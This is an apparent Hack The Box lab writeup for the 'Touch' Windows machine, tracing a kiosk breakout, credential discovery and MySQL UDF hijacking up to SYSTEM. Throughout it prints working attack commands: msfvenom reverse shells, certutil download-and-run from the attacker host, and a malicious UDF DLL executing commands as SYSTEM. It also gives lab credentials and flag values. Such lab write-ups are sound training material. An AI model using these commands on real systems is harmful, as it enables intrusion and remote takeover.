---
title: "Writeup HTB Touch Escalada Privilegios"
category: ["HTB", "Machines", "Touch", "Writeup_HTB_Touch_Escalada_Privilegios"]
---

Note title: Writeup HTB Touch Privilege Escalation

Windows Privilege Escalation via MySQL (HTB "Touch")

_Step-by-step explanation, in Spanish and plain language, of a complete Hack The Box writeup: from initial reconnaissance to command execution as SYSTEM._

# 1. Reconnaissance

The first step in any controlled intrusion (pentest/CTF) is to identify what services the target machine exposes. For this, a port scan with Nmap is used:

|   |
|---|
|nmap -sV -sC 10.129.71.63|

The scan revealed four interesting ports:

- 135 and 3389 (RDP) — Windows Remote Desktop.
- 5985 (WinRM) — Windows Remote Management.
- 8443 (HTTP) — A web interface called "Nexion DeviceHub - Login".

RDP and WinRM were temporarily set aside since, without credentials, they couldn't be used yet. Focus shifted to the web service on port 8443.

## 1.1 Directory Enumeration

The login page showed nothing useful at first glance, so Ffuf was used—a tool that tests numerous paths (URLs) to identify which ones actually exist on the server:

|   |
|---|
|ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios.png)|

This uncovered an /api path that returned a 403 error (forbidden). A 403 is actually a good sign: it means the path exists but is protected. Further enumeration under /api revealed /api/status.

Visiting /api/status without authentication returned device information, including its serial number: NX-DH-2024-B7042. This is a typical security flaw: an endpoint that should be protected but isn't, leaking sensitive data.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%201.png)

# 2. Initial Access (Foothold)

## 2.1 Logging into DeviceHub

The login screen had a "forgot password" hint stating the device's default password was its own serial number. Using the serial number leaked earlier (NX-DH-2024-B7042), it was possible to log directly into the DeviceHub panel.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%202.png)

Inside the panel, a set of credentials appeared: KioskUser / K!0sk2026#, along with controls to toggle the scanner and printer of the kiosk.

## 2.2 RDP Access and the Airline Kiosk

With these credentials, an RDP (Remote Desktop) connection was possible. However, instead of a normal Windows desktop, the screen displayed a full-screen airline self-check-in kiosk.

Following the kiosk flow (selecting language, searching for reservation with locator KS7X2M and surname Crawford), the process reached a document verification step (passport). Clicking "scan" triggered an error.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%203.png)

## ![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%204.png)

## 2.3 Forcing a Scanner Error

Recalling that the DeviceHub panel allows disabling the physical scanner, it was turned off from there. Returning to the kiosk and repeating the process, the scan failed again—but this time with a different, more revealing error message that included a clickable link. Clicking it opened a full browser window outside the restricted kiosk mode.

![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%205.png)

_Note: This is an example of "kiosk breakout": exploiting an application flaw (a poorly handled error message) to escape the restricted environment and access a normal Windows browser._

## 2.4 Escaping the Kiosk

With a real browser open, the Ctrl+O shortcut (Open file) was used, which displays Windows' native file picker. In the filename field, the path to Windows' command prompt was entered directly:

|                                                                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------- |
| C:\Windows\System32\cmd.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%206.png) |

This caused the file picker to download a copy of cmd.exe. Opening this downloaded file provided an interactive command prompt running as KIOSK-042\KioskUser.

|   |
|---|
|whoami<br><br>? kiosk-042\kioskuser<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%207.png)|

## 2.5 User Flag

The user flag (proof of account compromise) was on the desktop. Since this is a Windows console, `type` is used instead of `cat` to read file contents:

|   |
|---|
|**User flag:** a35793a700023b1b897afcd5c3bfeb0a|

# 3. Upgrading the Shell (Meterpreter Session)

The downloaded cmd.exe worked but was inconvenient (no copy/paste, limited). A Meterpreter payload was prepared to establish a more powerful and interactive remote session.

On the attacker's machine (Kali), the malicious executable was generated and served via a local web server:

|   |
|---|
|msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.190 LPORT=4445 -f exe -o /tmp/share/shell.exe<br><br>python3 -m http.server 8000<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%208.png)|

In parallel, a listener was set up with Metasploit—the process waiting for the victim machine to connect back:

|   |
|---|
|msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.15.190; set LPORT 4445; exploit"|

Back on the victim machine, using the already obtained cmd.exe, the payload was downloaded and executed:

|   |
|---|
|certutil -urlcache -split -f http://10.10.15.190:8000/shell.exe shell.exe<br><br>shell.exe<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%209.png)|

This opened a Meterpreter session as KIOSK-042\KioskUser—a far more comfortable and powerful connection than the previous console.

## 3.1 Session Checks

`sysinfo` confirmed the OS was Windows 11 24H2+ (build 26100).

The `post/multi/recon/local_exploit_suggester` module was run, which suggests potential local exploits for privilege escalation. It suggested several UAC bypasses (Windows' "allow this app to make changes?" prompt), but these were dead ends: such techniques only work if the user is already a local administrator, and KioskUser wasn't (only belonging to Printer Administrators and Remote Desktop Users groups).

_Note: UAC (User Account Control) is the system that prompts for confirmation before executing administrative actions in Windows. "UAC bypass" techniques skip this prompt but require the user to already have admin privileges, which wasn't the case here._

# 4. Locating and Reading the Application Source Code

Exploring the filesystem revealed the actual application structure:

- C:\Program Files\HTB Airways\Kiosk\ — Kiosk app (Node/Express/React)
- C:\Program Files\Nexion Systems\DocReader\ — DeviceHub backend (.NET), listening on port 8443
- C:\Program Files\Nexion Systems\Printer\ — Printer service (.NET)
- C:\MySQL\ — A locally installed MySQL 8.0 server

Reading the kiosk backend source code directly from disk (with `type`) uncovered the billing and staff authentication logic:

- src/services/document-service.ts: Performs actual passport OCR (using tesseract.js and sharp) and compares data against the reservation. This explained why earlier attempts to fake a passport image failed: verification is handled by the kiosk backend, not DeviceHub.
- src/routes/staff.ts: The actual staff authentication flow via QR code credentials (HTBAW-STAFF:<email>:<authCode>), validated against a MySQL table named _htb_staff.

## 4.1 Database Credentials

The database connection configuration file was located:

# HTB Touch Privilege Escalation Writeup

|   |
|---|
|type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2010.png)|

This file contains a default configuration used when the file C:\ProgramData\HTB Airways\db-config.ini does not exist:

|   |
|---|
|host: 127.0.0.1<br><br>port: 3306<br><br>user: kiosk_app<br><br>password: K!0sk_R3pl1ca#DB<br><br>database: htb_airways|

With these credentials, it was possible to directly query the staff table:

|   |
|---|
|mysql -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2011.png)|

# 5. Privilege Escalation

## 5.1 Current Privileges

Before proceeding, it’s useful to check what privileges and groups the current user belongs to in Windows. This provides a starting point to understand how far escalation needs to go:

|   |
|---|
|whoami /priv<br><br>whoami /groups<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2012.png)|

## 5.2 Finding a Higher Privileged MySQL Account

The kiosk_app account found earlier is low-privileged: it’s only used for the application to perform its queries (read and insert data). The technique intended to be used, called "UDF hijacking" (explained in section 5.4), requires a MySQL account with the FILE privilege, which is typically only granted to the root account.

An initial attempt to log in as root without a password failed ("Access denied, using password: NO"), so the password was searched for in configuration files, scheduled tasks, or other .ini files near the already known db-config.ini:

|   |
|---|
|dir "C:\ProgramData\HTB Airways" /s /b<br><br>type "C:\ProgramData\HTB Airways\db-config.ini"<br><br>findstr /si password C:\MySQL\*.ini C:\MySQL\*.cnf<br><br>findstr /si password "C:\Program Files\MySQL\*.ini" "C:\Program Files\MySQL\*.cnf" 2>nul<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2013.png)|

The MySQL configuration folder was also checked for a root password or a my.ini file:

|   |
|---|
|dir C:\MySQL /s /b \| findstr /i "ini cnf"<br><br>type C:\MySQL\my.ini<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2014.png)|

Next, the privileges of the kiosk_app account were checked to confirm if it (or any other accessible account) had the FILE privilege and permission to write to the internal mysql.func table:

|   |
|---|
|mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SHOW GRANTS FOR CURRENT_USER();"<br><br>mysql -u kiosk_app -p"K!0sk_R3pl1ca#DB" -h 127.0.0.1 -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2015.png)|

This confirmed that kiosk_app only has privileges over the htb_airways database, without global FILE privilege or access to mysql.user. In other words: this account is not suitable for the UDF hijacking attack. A more privileged account was needed.

## 5.3 Finding the Root Password

Returning to the C:\ProgramData\HTB Airways folder, there were three other files that were not locked: db-sync-replica.ps1, refresh-dates.bat, and refresh-dates.sql. Since the main file (db-config.ini) was protected but these "companion files" were not, they seemed like a good place to look for a second, more privileged credential:

|   |
|---|
|type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.bat"<br><br>type "C:\ProgramData\HTB Airways\refresh-dates.sql"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2016.png)|

Within these files, the MySQL root password appeared: HTB@irw4ys_DB!2026. With full access as root, its privileges were confirmed:

|   |
|---|
|mysql -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2017.png)|

As expected, root had File_priv = Y (i.e., it has the FILE privilege). With this confirmed, it was now possible to proceed with the UDF hijacking technique.

## 5.4 UDF Hijacking (User Defined Function Hijacking)

This is the core of the attack. MySQL allows creating "User Defined Functions" (UDFs) by loading a .dll file from a specific server folder called the "plugin directory." If an attacker manages to upload a malicious DLL to this folder and register it as a function, that function can execute operating system commands with the same permissions as MySQL itself — on Windows, typically SYSTEM, the most privileged user.

First, it was checked whether the plugin directory was writable using icacls (which shows file and folder permissions in Windows):

|   |
|---|
|icacls "C:\MySQL\lib\plugin"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2018.png)|

The result showed that the group NT AUTHORITY\Authenticated Users had (I)(M) permission, i.e., Modify permission. And since KioskUser belongs to that group, the plugin directory was writable by the attacker.

Normally, to upload the file, MySQL itself would be used with the SQL INTO OUTFILE command, but this path was blocked because the secure_file_priv variable was set to NULL (which prevents MySQL from writing files via SQL). As an alternative, since a Meterpreter session with filesystem access was already available, the DLL was uploaded directly through it, bypassing MySQL:

|   |
|---|
|ls -la /usr/share/metasploit-framework/data/exploits/mysql/<br><br>find / -iname "*mysqludf*" 2>/dev/null<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2019.png)|
|upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"|

With the DLL in place, the function was created in MySQL and its execution tested:

|   |
|---|
|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"<br><br>C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"<br><br>![Writeup_HTB_Touch_Escalada_Privilegios](/VaultSite/wiki-images/Writeup_HTB_Touch_Escalada_Privilegios%2020.png)|

The result was nt authority\system. In other words, from this moment on, every time sys_eval('some_command') is executed within MySQL, that command runs on Windows as SYSTEM: the highest possible privilege level.

## 5.5 Root Flag

With the ability to execute commands as SYSTEM, the same function was used to read the root.txt file on the Administrator’s desktop, an area normally inaccessible to the original user (KioskUser):

|   |
|---|
|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"|
|**Root Flag:** 91b23b71e4e73081e339e6b5fa59baa9|

# 6. Obtaining an Interactive Shell as SYSTEM

Reading the flag through sys_eval already demonstrated the success of the attack, but it was inconvenient to have to issue commands one by one. To achieve a full interactive session as SYSTEM, the process was repeated, but this time executing a new Meterpreter payload via sys_eval.

On Kali, a new listener was set up:

|   |
|---|
|msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.15.190; set LPORT 4444; exploit"|

And a new malicious executable was generated in another terminal:

|   |
|---|
|msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.190 LPORT=4444 -f exe -o /tmp/sys_shell.exe|

This executable was uploaded to the target via the existing Meterpreter session:

|   |
|---|
|upload /tmp/sys_shell.exe "C:\\Windows\\Temp\\sys_shell.exe"|

And finally, it was executed as SYSTEM using sys_eval:

|   |
|---|
|C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('C:\\Windows\\Temp\\sys_shell.exe');"|

The call waited while the executable ran, and shortly after, the listener received the connection: a new Meterpreter session connected as nt authority\system.

# Summary of the Attack Logic

From start to finish, the exploitation chain follows this logic:

Note title: HTB Touch Escalada Privilegios Writeup

- Reconnaissance: Identify exposed services and an endpoint that leaks information without authentication (the serial number).
- Initial access: Use the leaked information to access the admin panel, obtain credentials, and gain RDP access.
- Kiosk escape: Force an application error to exit restricted mode and access a browser and a full Windows console.
- Shell upgrade: Replace a basic console with a Meterpreter session, which is much more powerful.
- Source code review: Find low-privilege database credentials within the code itself.
- Search for higher-privilege credentials: Locate the MySQL root password in unprotected auxiliary scripts.
- MySQL privilege abuse (UDF hijacking): Exploit the fact that MySQL runs as SYSTEM and the plugin directory is writable to register a malicious function that executes system commands.
- Final result: Execute arbitrary commands as SYSTEM, the highest privilege level in Windows.